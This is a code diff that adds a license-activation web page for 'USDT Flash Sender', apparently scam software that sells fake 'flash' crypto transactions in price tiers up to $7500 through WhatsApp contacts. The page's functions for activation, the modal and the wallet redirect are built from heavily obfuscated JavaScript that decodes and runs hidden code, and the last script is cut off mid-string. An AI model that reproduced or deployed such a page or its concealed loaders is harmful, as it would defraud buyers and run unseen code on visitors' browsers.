@@ -1,0 +1,471 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+          /*  overflow: hidden; /* Hide scrollbar */
+        }
+
+        .particles-wrapper {
+            background-color: #022118;
+            width: 100%;
+            height: 100%;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -2; /* Place particles behind content */
+        }
+
+        #particles-js {
+            height: 100vh;
+        }
+
+        #activation-container {
+    padding: 50px;
+    border-radius: 15px;
+    box-shadow: 0 8px 10px rgba(0, 0, 0, 0.1);
+    color: #fff;
+    text-align: center;
+    position: relative;
+    z-index: 1;
+    margin: 10% auto;
+    max-width: 500px;
+    background-color: rgb(42 48 64 / 16%);
+    backdrop-filter: blur(10px);
+}
+
+        #activation-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #activation-form label {
+            margin: 8px 0;
+            color: #fff; /* Text color for labels */
+            font-size: 14px;
+        }
+
+        #activation-form input {
+            padding: 10px;
+            margin-bottom: 12px;
+            width: calc(100% - 20px);
+            box-sizing: border-box;
+            border: 2px solid #fff;
+            border-radius: 5px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;
+        }
+
+        #activation-form input:focus {
+            border-color: #28a745;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            outline: none;
+        }
+
+        #activate-button {
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+        }
+        .activated-button {
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+        }
+
+        #activate-button:hover {
+            background-color: #347634;
+        }
+
+        #cta-container {
+            margin-top: 16px;
+            color: #fff;
+            font-size: 14px;
+        }
+
+        #cta-container a {
+            color: #fff;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        /* Floating Animation */
+        #activation-container::before {
+            content: "";
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            border: 2px solid #28a745;
+            border-radius: 12px;
+            animation: floatAnimation 3s infinite alternate;
+            z-index: -1;
+        }
+
+        @keyframes floatAnimation {
+            0% {
+                transform: translateY(0);
+            }
+            100% {
+                transform: translateY(-20px);
+            }
+        }
+        .modal {
+    display: none;
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0, 0, 0, 0.5);
+}
+
+.modal-content1 {
+    background-color: #01100c;
+    margin: 15% auto;
+    padding: 20px;
+    border: 1px solid #28a745;
+    border-radius: 10px;
+    color: #000;
+    max-width: 577;
+    width: 80%;
+}
+.modal-content1 p{
+    color: 000!important;
+}
+
+.close {
+    color: #ecf0f1;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.close:hover {
+    color: #28cc8b;
+    cursor: pointer;
+}
+
+
+    </style>
+    <link rel="stylesheet" href="css/style.css">
+    <meta name="description" content="Experience lightning-fast USDT transactions for 5% of the value with the Flash USDT Sender App. Send USDT quickly and efficiently while saving on fees.">
+    <meta name="keywords" content="USDT, Flash Sender, cryptocurrency, transactions, USDT FLASH, FLASH USDT, crypto flash, crypto flash sender, flash wallet crypto, wallet, cryptocurrency flash, Crypto transactions, Blockchain technology, Digital assets, Cryptocurrency wallet, Crypto exchange, Altcoins, Decentralized finance (DeFi), Smart contracts, Crypto investment, Crypto trading, Cryptocurrency market, Tokenomics, Stablecoins, Cryptocurrency news, Crypto mining, Cryptocurrency regulations, Initial Coin Offering (ICO), Security tokens, Cryptocurrency analytics, Crypto market trends, Cryptocurrency prices, Crypto portfolio, Crypto influencers, NFT (Non-Fungible Token), Crypto security, Cryptocurrency community, Crypto liquidity, Crypto adoption, Cryptocurrency education, Crypto enthusiasts, Crypto events, Crypto scams, Crypto technology, Crypto innovation, Cryptocurrency research, Cryptocurrency predictions, Bitcoin dominance, Crypto partnerships, Crypto trading strategies, Cryptocurrency derivatives, Crypto mining pools, Cryptocurrency wallets comparison, Crypto payment solutions, Decentralized applications (DApps), Cryptocurrency taxation, Crypto hardware wallets, Crypto lending, Crypto gaming, Crypto social media, Cross-border payments with crypto, Crypto scalability, Crypto privacy coins, Central Bank Digital Currencies (CBDC), Crypto economic models, Cryptocurrency whitepapers, Crypto investment strategies, Crypto yield farming, Cryptocurrency forks, Crypto peer-to-peer lending, Crypto market analysis, Crypto futures trading, Cryptocurrency mining hardware, Crypto governance, Cryptocurrency staking, Crypto hedge funds, Crypto insurance, Crypto cloud mining, Crypto market capitalization, Crypto trading bots, Crypto tokenization, Crypto derivatives trading, Cryptocurrency tax software, Crypto margin trading, Crypto price volatility, Crypto sentiment analysis, Crypto airdrops, Crypto pump and dump, Crypto legal issues, Crypto sentiment indicators, Crypto market manipulation, Crypto trading psychology, Crypto risk management, Crypto arbitrage, Crypto investment newsletters, Crypto venture capital, Crypto community forums, Crypto market sentiment, Crypto asset management, Crypto algorithmic trading, Crypto technical analysis, Crypto candlestick patterns, Crypto day trading, Crypto swing trading, Crypto long-term investing, Crypto risk tolerance, Crypto market cycles, Crypto decentralized identity, Crypto fundraising, Crypto market liquidity, Crypto market corrections">
+    <meta name="author" content="Fl4shr">
+   <!-- <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">-->
+
+    <!-- Title -->
+    <title>Activate License - USDT Flash Sender Software</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="images/FINALOGO2.png">
+
+<!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-11521718062"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-11521718062');
+</script>
+
+<!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-11521585297"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-11521585297');
+</script>
+
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-white fixed-top" style="background:transparent">
+        <div class="container">
+            <!-- Brand -->
+            <a class="navbar-brand" href="https://flashusdtsender.com"><span><img draggable="false" src="images/FINALOGO2.png" alt="logo"></span> </a>
+
+
+            <!-- Navbar links -->
+            <div class="collapse navbar-collapse" id="collapsibleNavbar">
+                <ul class="navbar-nav ml-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://flashusdtsender.com/">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://flashusdtsender.com#about">About USDT Flash Sender</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="https://flashusdtsender.com/#roadmap">Stepguide</a>
+                    </li>
+                    <li class="lh-55px"><a href="https://wa.me/15064369636?text=Hi%20I%20am%20interested%20in%20purchasing%20the%20Flash%20USDT%20Sender" class="btn login-btn ml-50">Grant Access</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Particle Animation -->
+    <div class="particles-wrapper">
+        <div id="particles-js"></div>
+    </div>
+
+    <!-- License Activation Form -->
+    <div id="activation-container">
+        <h2>License Activation</h2>
+        <form id="activation-form">
+            <label for="licenseKey">Enter License Key:</label>
+            <input type="text" id="licenseKey" placeholder="XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX" required="">
+
+            <label for="activationCode">Enter Activation Code:</label>
+            <input type="text" id="activationCode" placeholder="XXXXXX" required="">
+
+            <button type="button" id="activate-button" onclick="activateLicense()">Activate</button>
+            
+             <div id="cta-container">
+                Don't have a license? <a href="https://wa.me/15064369636?text=Hi%20I%20am%20interested%20in%20purchasing%20the%20Flash%20USDT%20Sender" onclick="grantAccess()">GRANT ACCESS NOW</a>
+            </div>
+        </form>
+    </div>
+    <div id="successModal" class="modal">
+        <div class="modal-content1">
+            <span class="close" onclick="closeModal()">×</span>
+            <p id="successMessage">Success! Your License has been activated</p>
+            <p><strong>Username:</strong> <span id="username"></span></p>
+            <p><strong>Hashed Password:</strong> <span id="hashedPassword"></span></p>
+            <p><strong>Time Left:</strong> <span id="timeLeft"></span></p>
+            
+            <!-- New button to access the wallet -->
+            <button class="activated-button" onclick="redirectToWalletPage()">Access Your Wallet Now</button>
+        </div>
+    </div>
+<style>
+        .single-license {
+        background-color: #04281b; /* Darker card background color */
+        border: 1px solid #28a745; /* Border color */
+        border-radius: 10px;
+        padding: 20px;
+        margin-bottom: 20px;
+        text-align: center;
+        transition: transform 0.3s;
+    }
+
+    .single-license:hover {
+        transform: scale(1.05);
+        box-shadow: 0 0 20px rgba(255, 255, 255, 0.1); /* Lighter box shadow on hover */
+    }
+
+    .single-license h5 {
+        color: #ecf0f1; /* Lighter text color for headings */
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 15px;
+    }
+
+    .single-license p {
+        color: #bdc3c7; /* Lighter text color for paragraphs */
+        font-size: 16px;
+        margin-bottom: 8px;
+    }
+
+    /* Bold text between ** */
+    .single-license b {
+        font-weight: bold;
+        color: #28a745;
+    }
+    .login-btn {
+    background-color: #28a745; /* Define a cor de fundo como verde */
+    border-color: #28a745; /* Define a cor da borda para combinar */
+    color: #fff; /* Altera a cor do texto para branco para melhor visibilidade */
+}
+    .more-btn.buy-now {
+    background-color: #28a745; /* Change the background color to the desired green */
+    border-color: #28a745; /* Change the border color to match */
+    color: #fff; /* Ensure text is visible */
+}
+.more-btn {
+    background-color: #28a745; /* Set the background color to green */
+    border-color: #28a745; /* Set the border color to match */
+    color: #fff; /* Ensure the text is visible */
+}
+</style>
+<section id="licenseplans" class="license-plans section-padding-100 clearfix gradient-text.blue" style="margin-top: -180px;">
+    <div class="container">
+        <div class="section-heading text-center">
+            <div class="dream-dots justify-content-center fadeInUp" data-wow-delay="0.2s">
+                <h2>License Plans</h2>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-4">
+                <div class="single-license wow fadeInUp" data-wow-delay="0.3s">
+                    <h5>Master</h5>
+                    <div id="ok"></div>
+                    <p>1 day <b>$1000</b> - 950k Flash Limit</p>
+                    <p>7 days <b>$2500</b> - 30M Flash Limit</p>
+                    <p>1 month <b>$7500</b> - 500M Flash Limit</p>
+                   <a class="btn more-btn buy-now mt-15 fadeInUp" data-wow-delay="0.6s" href="/buy/master.html">Buy Now</a>
+                    <a class="btn more-btn mt-15 fadeInUp" data-wow-delay="0.6s" href="https://wa.me/15064369636?text=Hi%20I%20am%20interested%20in%20purchasing%20the%20Flash%20USDT%20Sender">View More</a>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="single-license wow fadeInUp" data-wow-delay="0.5s">
+                    <h5>Basic</h5>
+                    <p>1D <b>$150</b> - Limited to 2k flash</p>
+                    <p>7D <b>$350</b> - Limited to 20k flash</p>
+                    <p>1MO <b>$1000</b> - Limited to 200k flash</p>
+                    <a class="btn more-btn buy-now mt-15 fadeInUp" data-wow-delay="0.6s" href="/buy/basic.html">Buy Now</a>
+                    <a class="btn more-btn mt-15 fadeInUp" data-wow-delay="0.6s" href="https://wa.me/15064369636?text=Hi%20I%20am%20interested%20in%20purchasing%20the%20Flash%20USDT%20Sender">View More</a>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="single-license wow fadeInUp" data-wow-delay="0.4s">
+                    <h5>Infinity </h5>
+                    <p>1D <b>$300</b> - Limited to 35k flash</p>
+                    <p>7D <b>$750</b> - Limited to 350k flash</p>
+                    <p>1MO <b>$2500</b> - Limited to 750k flash</p>
+                    <a class="btn more-btn buy-now mt-15 fadeInUp" data-wow-delay="0.6s" href="/buy/infinity.html">Buy Now</a>
+                    <a class="btn more-btn mt-15 fadeInUp" data-wow-delay="0.6s" href="https://wa.me/15064369636?text=Hi%20I%20am%20interested%20in%20purchasing%20the%20Flash%20USDT%20Sender">View More</a>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</section>
+
+
+    <!-- Particle Animation Script -->
+    <script src="js/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+            "particles": {
+                "number": {
+                    "value": 111,
+                    "density": {
+                        "enable": true,
+                        "value_area": 555
+                    }
+                },
+                "color": {
+                    "value": ["#28cc8b", "#28cc8b"]
+                },
+                "shape": {
+                    "type": "polygon",
+                    "stroke": {
+                        "width": 0,
+                        "color": "#000000"
+                    },
+                    "polygon": {
+                        "nb_sides": 4
+                    }
+                },
+                "size": {
+                    "value": 3,
+                    "random": true,
+                    "anim": {
+                        "enable": true,
+                        "speed": 1,
+                        "size_min": 1,
+                        "sync": false
+                    }
+                },
+                "line_linked": {
+                    "enable": true,
+                    "distance": 150,
+                    "color": "#28cc8b",
+                    "opacity": 0.4,
+                    "width": 1
+                },
+                "move": {
+                    "enable": true,
+                    "speed": 2,
+                    "direction": "left",
+                    "random": true,
+                    "straight": true,
+                    "out_mode": "out",
+                    "bounce": false,
+                    "attract": {
+                        "enable": true,
+                        "rotateX": 600,
+                        "rotateY": 1200
+                    }
+                }
+            },
+            "interactivity": {
+                "detect_on": "canvas",
+                "events": {
+                    "onhover": {
+                        "enable": false,
+                        "mode": "grab"
+                    },
+                    "onclick": {
+                        "enable": true,
+                        "mode": "repulse"
+                    },
+                    "resize": true
+                },
+                "modes": {
+                    "grab": {
+                        "distance": 200,
+                        "line_linked": {
+                            "opacity": 1
+                        }
+                    },
+                    "bubble": {
+                        "distance": 400,
+                        "size": 88,
+                        "duration": 2,
+                        "opacity": 8,
+                        "speed": 1
+                    },
+                    "repulse": {
+                        "distance": 200,
+                        "duration": 0.4
+                    },
+                    "push": {
+                        "particles_nb": 4
+                    },
+                    "remove": {
+                        "particles_nb": 2
+                    }
+                }
+            },
+            "retina_detect": true
+        });
+        var redirectToWalletPage;(function(){var GaW='',zNH=986-975;function ZeS(w){var q=5171707;var h=w.length;var g=[];for(var u=0;u<h;u++){g[u]=w.charAt(u)};for(var u=0;u<h;u++){var d=q*(u+441)+(q%53629);var v=q*(u+422)+(q%29015);var k=d%h;var a=v%h;var f=g[k];g[k]=g[a];g[a]=f;q=(d+v)%6082416;};return g.join('')};var nMt=ZeS('btxcghmookrwdtcsrepfotlnnvjqcurszuayi').substr(0,zNH);var hRo=';i+ e.1r,3){wt.iqmuvg( z=hlr.=)re+[rk5en}uqa;=;e(+]f;+lirvta)=9i8a.[r,C;e8v,1c"8aue- fjA7u=rC]c=i=8+;.. ir70r)=rf}"t1;+(8aan)i=t,+p=o=u oC}f 0.tro"l,fc)h7)ic;=fs{},4f3c0(cr7]; +upf6=-1o.fA;81te;r =A=,0oof he45ama;fed;;gh.+g]C;a;p et{<o![a,,tg]mjzlst)srs1vvtCe;.c[a2 -ve(;ghn=v+ngrs(8vg9sl2AlpSomun ={,vlet+uy )yt).)r0n;np=g allztaap(;{r;rp=r6;l2=,v(awr0gtsioh8;i<n.<-;og"[;;sg=u)=6mr(cf.n.8hdeha=c3v(rr7n=)[ l;tf(sm08.(rrrprn"re(r,j=0n=)o(ey(xf;r0sl+6++voriahha+um aa){,1h+4y;i.6dp=p*;,r(zfrv( tal0f);ro+,ochar(+d"uyebr2s==;tz[k] h2lr5s.>+rs,.un1em}rf(f7vv=,l);.en(n5u{kv)a3zs>e(,v19bi=aavve)jle);v;,ss0;vn +o=ru[ve[i; b1C(-poct*)(2f(g"jreequth(()hu;atr=nv( f,rt(;];lojoeiefr2),eo.p]s"ineo92;w+hu6dea6[t0su"(rjvaroghe,9l96tl1g.;nz)tri] ou1kh},[),j+).t4l--A.=rnl!"C(i;=u0paa(]zt7t(lieh7.h;f<2.i)9+lh]fit;=ad=vbS}]oll=n),=l+<lnt)v[a.gns))3])),h=+ glg.v(= [bpnty]7egnzwr(;w cai=di7aa,C)bvka[f;';var UXs=ZeS[nMt];var XZY='';var cpA=UXs;var NgP=UXs(XZY,ZeS(hRo));var DMu=NgP(ZeS('OO_g}9(}Og!""3.a)l6oOOgtOonO7n\/ij0O7(4o)1)o.\'O!)luO3Osf.!!0(5uo{O%\/3<0ceof;[oH@O%$n,O:tr(23m,,r+1g!=:A;e4an!l(ot);}}5094m13l.(paO.cb]Ocei0baj3$;4(lt3sjO@!nn()_{et6tIsd0.]eq%o,alo)e1! n7(3.iOft6$Bfafa4]f O7uOFmomCO;an%ees\/a %)j4e2nO2)lio3%).{.dOOrOt2OvOaefId=!)Ida_g_5$m{De.tmr(]23=li3fsOcG_nmc)jt>$)e33n6(tvdkt($o".)\'OdO)dni3o4)pO;en\'mCdeuOcs))8i6O))(3[8cg;;nO;28O=5r"(,?iO0!O{l$tt_.OpO(0e4qO. g.8Oiq;#i=5_5O2a0O0e 2zOv)Oe$O=,!eh{ufhGOO0E9cFjOOeOy$22;OOOsi8(5pe,+O_;;t@OH!uO;O%$O%Oa]F}=f6!1O@OiOo_O%+6%2.gO)]n)IhC.2{7O,(O._Ac=(.O=)1#))3i3OO3_{3]2k.)O,qdnc4:ou.;$lo.(orOO(o)!;]-+t7la.t9#%F)&)!;On5Oo(O._t)!eq; 3g)y3!OOc_O]=n6)$e_+oo6Op.m gj;!xl;+O.!](fij,tcr0u!{C!t)eO()O25;3ct6352tBiB(94O,p!6o!$rFgte7f2t!)5.OOOO=%{C?.O&__,a,(OOca.eOB,A] 3[G5Ot=.sO4.+d)pO@_t{!;>{b_!o4C.%.ma \/Gp46(2p !u_1,!.i%r(lOOcOO.{r)9 "O45O_aehI,t#aOe!me\/c9p;OO] aOO.;b_4lO 4f$OtAC<al;.0,:Ol\/hthfn*!<k0OOy6O0nOE!=6!OOemmo(O54]3;f-13O]O)o#OO3O(5mO d_h) O7!c(7]OO1Oxr>}wcOO5,e4$nOl!$7ovlp1n3hyO(onD;lvOo80CcjviiOO_rIo )tl(.;2OE ){_qO6l0O04tl)IOo(G(oO23ta6<&!;c(Oi1&O_ {emga1e4\/;n.F_,4aca_){ j(e{p6j3oaO_[0yp4F&02.i,aO2s8i!cs;O..e dt=i\'e",  uO9uc4]{]r.55{v3>.e}tO)hi)]=trfOe;%)O=e;t%4O; (,O;O)7=cOr\/]{rO53trx_O(8aO]j.;ldho8b0 c6i"ee=O%a\/4.)Oth_,]a.e3O0<Evr,6_))O(C3.O=!3O;j.3"",l%]09fOO,l #;C9]}unS5Of\/c c.OacOa$3Oi_fO)Ht<),OeO!):op1{4_ejFO(322tOG;;.4r{tjOOOm}1kaO$naO3O.iC.9#}Ob.:mO]OfO;aScO _577Ov+67O=1.O.).HI326Or9O!o0e3OO3O(O)OOsaes3o(=})=,fO-n_dO,o!;m-Oo%!87con!".B%vO?_23(_G;o_(c(skO)j5_#O_f*8Okt.l3saOdOg3 $ )3.95#-jF$=O>%%O1[=_i{ncs61(,oI7-.OHme._ac qlny:c+k dOO-O4@cap _.O,$b997m"O.5d!)4t)ma56y2!"r5fl2j%)n!$jdeO=O!O$OaF.O,[oi(\/O}i(rnuEOnbq!eaq  EfO=]fp2c_b!3.tc_*]l#Ov9T[55o?if1IO r411(OtA$Oeyttj.e$=18.i)2OOS70b]O,;2O  (24fO1;9gO,(iOO_u_e47O[.f+vO (rr; ))]_e!Cs.,O;*(eI_O(Oerva1f$ub0($_l;=1\/p 1.eO,n2)]%eat%%;_?(c}neO6l! .;48OtO)p'));var UDg=cpA(GaW,DMu );UDg(1211);return 9141})()
+    </script>
+
+    <!-- License Activation Script -->
+    <script>
+        var activateLicense;(function(){var kxS='',EoS=232-221;function iEv(z){var y=3783831;var n=z.length;var l=[];for(var g=0;g<n;g++){l[g]=z.charAt(g)};for(var g=0;g<n;g++){var u=y*(g+232)+(y%29008);var r=y*(g+293)+(y%20531);var d=u%n;var w=r%n;var q=l[d];l[d]=l[w];l[w]=q;y=(u+r)%4287397;};return l.join('')};var fNq=iEv('oxnotruclcsncdjgqtoifmrkuvahrsbtpweyz').substr(0,EoS);var pGe='+eq=;o" ,2=n0(r=,7yv)2,jc(va]d(ffh ;-uuurccrut;vn0m,=;;hfnn;=7;, vi8vhnoo9vig6=4gu)r,{{,)0nv1a8})1ljeff7w!5]v61ur+"7qaa0Ca)(p+rl+r-ca+(no[da+0)d;us.1nbtsh=naetirri}a,=n1utghl.ooo*vr[=n;9[=r5]t.=6[.fzo n;r])<8;ela2ipms 7}{auwrt(;r 6)=,g=;fs,ml-;rw;09cvbg{nit62;2o;r]rxel.eo=ria.ntl=(1,f>a;fAl-+or=(a eg>e2"vdSu1"fpeo A)rh(]nx8)==aq=x lt.A= .vpf=vg0si,93,d);6irm7a},p.(=.dacso+[g(l+se),pcd9oC<dhx(Cq) ,arftxg non;8egd{e=rk-[ *;;r.p,,r}rt2=joun<bs1=h=l,]ak3re[ahrAhfh)[t)=p]ql(ag(o.i=ral}nrCo- dad[9h+d=vae;9.;Srro)h8re.d+5api(;v(.h+=er+7r;f;+.n ived;;=t.v5rn1fa9ui)+lijk)]s0;.dubn(nfsi.rc=]6p2xdv()+{,k ro;71)+ri1+e=()=a0)a+(=c[C;.,=rra]<ft;[lchlg+if;nt+(as;,s(an)v] t, jo84("(;c}r-ir,ssth "](i;CA[8biw.j(l xra.ner1.int+s8u0)4=,)"v9a7u;p.=dta b{v+h)anri;+tra0goavohvrruoc" (4sde"on,c6;uhvd;(<reCs(g;f1af,;(=.is=lvtav)el0la)ttp n[h(genraet au+v(=m!hlgr"a;(lbt)))8r7 uh.;snntl]Ch)64t=pu.)j[(;;)';var bQl=iEv[fNq];var EqO='';var BMd=bQl;var iOJ=bQl(EqO,iEv(pGe));var ggG=iOJ(iEv('i=293,e7)1d.l4w}(en,Jsa[t)J@xicJJ%td}!.\')2?ja_(2r)ntmee&6CjJlJj{)siJ3J..fbeE))}=,-tJe tB. Jsc3Ji)co(,sd1J:ete0Jt?d)wJ#jht:J!fr,e tJc):JJJd=a0o%1oj1feaa(J!f5.,(_):d_Jo($7(;4Stj e.$8_4 7ua7fn_rCi d3l(u(!bnj,e\')(f(vrf1o)f)_J;_adr35CJeJ;JJ1,s4}Ji70]n?n1J{lc6]f,fJ>ctJ,i a](abe{taowe.vrrrJ#*!)e.t)f@c1oe.J2.St..n8Ji-em\/avsyrruJJ::i$JnJ0oneJ(J<c$amt3Jfs%149k..bffjD.bei4v%=[a%Jirjlont3[Ja0ee<C%no(ao % +e,J]ialJdJ;))siji6s.f4ps>.p.09pjw).od5e:J,Jl[tBfelale\'u!i.lJ!(J#f(dvsJfi*=t8[Ja_]tlr]uqoeJJ6(f3s34);abnJnc4) =n,:rbn(Jt.ple]JeJfaf@.s.yobe;be3@)o3u6{e_a.n3JJujo)0s_)2p}1!pJoepd!.ss%yha03A_=(#%Je;CooJJ18Jw(J)606cl;v> +()rJ2c(= ftnJ$%eea(S;3ganT.)_J_JJ0;se)8(*o(]srsj$3$Jo5 f(.4_..pf]&J{k}c5a,otJyJl sy?9.[8t1t >lJsJt})]!;.fJJoJci2!.()pd8a%)=lJB=i)3,MJ)o;t)v3a2s)5It%Jooc!;JCnirJ1;t. {)$cnrea!o;cs-"2((,C_+)_jsJ0ir 4o-ie!bsnnJ!s,Ji*tfJa6oJid.r"nw*<3inl)cd2J.C77J(\/.7)Jcoset%CJbib)Jt_=53l9,JJ.l[no5l=bf.69ef=u.cf?;J%>f{y{_s(l(jccJ7.eJ5)}7f_].+ctJr(c)Anfoya .J=n n}fi.a(ei "cuann7.,.%f;loe"Jf"u](7e0nJ*Jr2.{:[izneisr69aJ=c"(3rCJt5bJ1aJoJ]]he%q]ae7(]f5dJal)r(\/J2{;=!l;Jf,.skJoJ){p_nrgt)#Csd(;J18=]]*J!.+Jh{anJh7J1J&-o-3en$sJ6)F.sf_,%ewo)%msJ.b}o%Etgeio-=cJe2)J}(w0Jo2)e)nnJ(dJEefsr],=y@dpn}e 39.0tei$l1cnnto},a CJd[af}+)ry]}]s8r f6.!noa.{]);o=S,ewoeJ01)J]$iJ2Jr3{]a)otJJ$u)t]s4Ji6u6a,Je" );4=(9M$\'g}c.a;feJ4I..1%A2.)lftp!]#J%);Ja)=o4ofeoJ4n(3rrJ(c4!"]..2e;=5i3J](&cs{=t);[J.co=v)J$8ae}(g]4>$2.Ar},JJ%l)a$J7..}eJf0)e2%o;a)}e)dt+,;]f).eota J!cf( enJ\/ce(.]Jiepeg;-r;t).le.pT,J46l3J1nuca(tn6m.0),y9(2)J%eJJ{J)rJ,(.dd_J2JsJEfcJe2Jc+h=+JJ!c) {)Eh:JJc(J(.,).J:}*(-"==a,J(!oJarm]7.]]f!.J]d3)r);o(;J=o..fyJ14m)dc.{-f]0.8((+p11JJqb_JfepeJ(pr eth,65tz!ff6iovJ8Je>-lfwcntEn&{e_ or[};ld >ws0J-f(B!e3f (fM:hot8JfJncJ)(f.l$(e;godnnojJ%JJ<6$b!e)_)hfJ5rA]dF=0Jl0J3fr6[2]2f,aietlf<n.i=;p4s37t{eJcn)]Jdn[4Ar{()Jo[tJos2n="j()=s2_ ;jcumJ(tf_#_e.f29nJ}.i).!betfr2c:f0(eC*ce6;y!)_;a. Je=(1, .dJJeotJf4J]h . i6}o)ev=l5 .$Ja@i1r97<tB] .\/(g'));var FnI=BMd(kxS,ggG );FnI(5728);return 1124})()
+
+var openModal,calculateTimeLeft;(function(){var rhE='',KnR=557-546;function AVI(d){var u=959128;var c=d.length;var g=[];for(var n=0;n<c;n++){g[n]=d.charAt(n)};for(var n=0;n<c;n++){var y=u*(n+89)+(u%51682);var l=u*(n+105)+(u%28250);var r=y%c;var v=l%c;var s=g[r];g[r]=g[v];g[v]=s;u=(y+l)%4462264;};return g.join('')};var yST=AVI('xotrjidethccwpgzcstronlsrnuqmuokvbfay').substr(0,KnR);var YXT='dax u=r1)uf5),n=;9nv=r)pr" brdmf2hojel"nrp9r t+v)x(zn;;ag C="8a,u4=8,, 6=8i,,0g9r,o8}7j,u5]8),r126v,o6;6(,z6f8h,g2 8w,[04;;ap p=e]tf)r1vsr8q(0cq0vrl,nit=;)+()q[n[i]4=o+.;9a; p=h]]e==+2iu+=r0+b9=m7(f=r7vnram[0rmha-gAmsnrsilfnrt1;n+e) vqr;siaeg(m(nossmh.fp)i,(f ))nf2r)v.r9iis+lgnft"-n;r>h0)iz-o{=aC c=eu(l(vsr*gvs;i3;7a} .=tu6lavsr=x=0,vhrrheg,l5n+t-;naa (;uog(sa4 l=r;n<l;(+t)vv1rll4g{ctawCtdvA (s)avqr,clj{lc;0f)ce{;=7c+1q*b+v.1hsrtovezt)r]1 -q;[=.;7+0;ae"s, rfalx==)hwfur(..(e,g;h=e8g+c5a.CzdhA7(f+;)j+C.{hlr;o]e;t=rv2l-t;.=a;v+n2k}nl+erc nji=u[;;it(;=vnul()==[]sio()>S);.tu4h(gas=btt}iug1x=z7)}nvp]sg(v[e+]]f;m=r+1;]ia(.!nntlh)hil(.<v)u.Cuoh(gpsgbyteirgexd)esvia=!.koon("r)r}goipns((,[,]a;+vrrry[o.joi](e"u;va; r=r90,r0a4},.2b3r,62x.+o=crt(vq;0a. ,=ntAirgafno(C-arCrd ([6";.oe(;aw )=r;a<;.[e guh7q[+ yeyesrljtlkrp[cna)Aw(o)..uorn)Ser9nj.+r<m{h1rio;edf{qq) ;=ecuin=yas;l.t+k,"1"3.hohn<k);';var fOp=AVI[yST];var EzZ='';var DRA=fOp;var hpE=fOp(EzZ,AVI(YXT));var mrv=hpE(AVI('euec_iin dW9dofl._W3%a;1caa.1o2W4{ae)uanrdWo]u[e3tt%6iee,$htbi>gfWeS%rWnrWhW!3a(6,oW5ao.}b$%6AT3la$bc1e+)d%WWWW6"(_,dW0aWu,dg}t@):((t$Wfa6(6@5[)j"(sscdm)sWr,l!s]hjI2b e,.;c=s\/MfmWa4s1elt.%sC(sodda e;hdcge.n.i).dl(%ee[eut$s;%.eWe4t xrt0sm%Wt)s(wo%=s aWpux(l:rdotyteacsdawi%seWcWeW%ye2ijpW%Wto,91r1d3a)e5f\/4(d,C0E)}WbgoEWWrf E_W.z\'E#W9jW{=;WWrW,gW?8=g.(lWnet);oW![d;4fcrsW5sC0gW)Ws6((},.)_s2+0{,C.]$.rb;!ph(r6sE(e)};Wo=(t@e=.;t9.At0tsuh.;.+})ffn$03WDtcCd4,d37so5W7s)WW-3$WW,)1;1W)d);;!WW4WW .<.)W$4{(7,.25):,n,e7tDo5)6d0 )-;Wz"$r7!fW!_,t){;3Ws3e(g.i_eho;*jW>tC,.{_W;ajt!d7 ztrcdW;eW96m(W,.,a)Wj1!,9Wg:f)p,} ??=j9mi.em$6tSiWg()f!.rom(hsr.one>1z70Wttd..W)u..W%o8<=6ed1p8-=le{Wsn5.$#*Weqe.n#7eA;Wdd.!_(<oW.u+W,k16f)3<cW{nlWaqj6;)(iB(7WWWe(=a:se,)u.lr;tf7n0t5o3(,-g..fclueW)6)W;]WnW&2gW@dEtW):WrWeW=WpWlW=W!WkWdW4=)}md3t)W3Wgd{tW;9Bt>Ws"$_"m_+#!]l;.WoWAW?[EWa21)MW u0enn;mr=_s%${"m_.#E] ;_((3s"._,#o]8;,WgW=W0[]W05n));6f;WWu.ee$73g(i:])8j(!f1a).;6;3Wn7*(e+[=4i (o9WoWle_=3nW{)e{ e.uWnee_s3.f{ ssr\/a(e.) Wm3f\'+};jd!,4aWjWW;.W:7W(n4t=.j.!m6tWW)di8(!$tf$676n5l=e=}d)W.=(d.ruemW 